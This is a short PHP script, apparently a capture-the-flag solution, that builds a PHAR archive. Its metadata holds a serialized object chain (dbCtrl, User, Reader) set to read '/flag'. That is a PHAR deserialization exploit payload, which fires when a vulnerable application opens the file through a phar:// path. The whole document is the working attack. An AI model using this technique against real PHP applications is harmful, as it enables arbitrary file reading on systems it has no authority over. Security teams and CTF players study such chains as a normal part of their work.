<?php
include 'classes.php';
$c = new Reader();
$b = new User();
$b->nickname = $c;
$b->backup = '/flag';

$a = new dbCtrl();
$a->token = $b;

$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

$phar->setMetadata($a);
$phar->stopBuffering();
